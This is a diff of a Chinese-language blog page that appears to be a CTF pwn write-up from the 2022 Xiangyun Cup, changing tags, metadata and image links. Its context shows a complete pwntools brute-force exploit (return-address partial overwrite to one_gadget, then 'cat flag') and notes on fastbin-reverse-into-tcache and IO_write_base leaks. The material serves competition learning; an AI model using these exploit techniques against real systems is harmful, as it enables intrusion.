@@ -25,10 +25,11 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://nqoinaen.github.io/img/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B.png">
 <meta property="article:published_time" content="2022-10-31T05:36:56.000Z">
-<meta property="article:modified_time" content="2022-11-01T04:57:48.003Z">
+<meta property="article:modified_time" content="2022-11-01T05:02:40.048Z">
 <meta property="article:author" content="nqoinaen">
-<meta property="article:tag" content="IO_leak">
 <meta property="article:tag" content="off by null">
+<meta property="article:tag" content="IO_leak">
+<meta property="article:tag" content="fastbin reverse into tcache">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://nqoinaen.github.io/img/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B.png">
   
@@ -251,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          11k 字
+          10k 字
         
       </span>
     
@@ -262,7 +263,7 @@
         
         
         
-          23 分钟
+          22 分钟
         
       </span>
     
@@ -361,7 +362,7 @@
 <p>（然后这个爆破脚本可能有些问题，本地可行）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./unexploitable&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>    payload+=p8(<span class="hljs-number">0xd1</span>)<br>    se(payload)<br>    <span class="hljs-comment">#debug()</span><br>    og=[<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>    se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xfc</span>)+p8(<span class="hljs-number">0xE2</span>)+p8(<span class="hljs-number">0xd6</span>))<br>    sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>    r.recvline_contains(<span class="hljs-string">&#x27;flag&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    r.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        r=process(<span class="hljs-string">&#x27;./unexploitable&#x27;</span>)<br>        <span class="hljs-comment">#r=remote(&#x27;39.106.13.71&#x27;,31780)</span><br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 <h2 id="leak">leak</h2>
-<p>主要参考这位师傅 <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1705930-1-1.html#44512750_%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">wp</a></p>
+<p>这题有必要复现一下，主要参考这位师傅 <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1705930-1-1.html#44512750_%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">wp</a></p>
 <h3 id="0x01程序分析-3">0x01程序分析</h3>
 <p>保护全开</p>
 <p>delete中存在uaf</p>
@@ -381,9 +382,9 @@
 <p>用fastbin reverse to tcache的手法，改IO_write_base 为tcache的bk，可以是堆基址+0x10</p>
 <p>（fastbin reverse to tcache的攻击效果是往target-0x18处的地址写入对应tcache的bk指针，也就是一个堆地址）</p>
 <p>要满足tachebin有一个为空，这里是0x40有6个</p>
-<p>![fastbin reverse tcache1](2022第三届祥云杯网络安全大赛pwn/fastbin reverse tcache1.png)</p>
+<p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache1.png" srcset="/img/loading.gif" lazyload alt="fastbin reverse tcache1"></p>
 <p>接着我们再申请0x40的话会把fastbin中0x40的放到tcache中，然后target处写入了堆地址</p>
-<p>![fastbin reverse tcache2](2022第三届祥云杯网络安全大赛pwn/fastbin reverse tcache2.png)</p>
+<p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache2.png" srcset="/img/loading.gif" lazyload alt="fastbin reverse tcache2"></p>
 <h3 id="0x03本地准备">0x03本地准备</h3>
 <p>版本差异，有必要patchelf一下</p>
 <p>用glibc-all-in-one下载这版本，找到配套ld</p>
@@ -430,9 +431,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
+        <a href="/tags/off-by-null/">#off by null</a>
+      
         <a href="/tags/IO-leak/">#IO_leak</a>
       
-        <a href="/tags/off-by-null/">#off by null</a>
+        <a href="/tags/fastbin-reverse-into-tcache/">#fastbin reverse into tcache</a>
       
     </div>
   
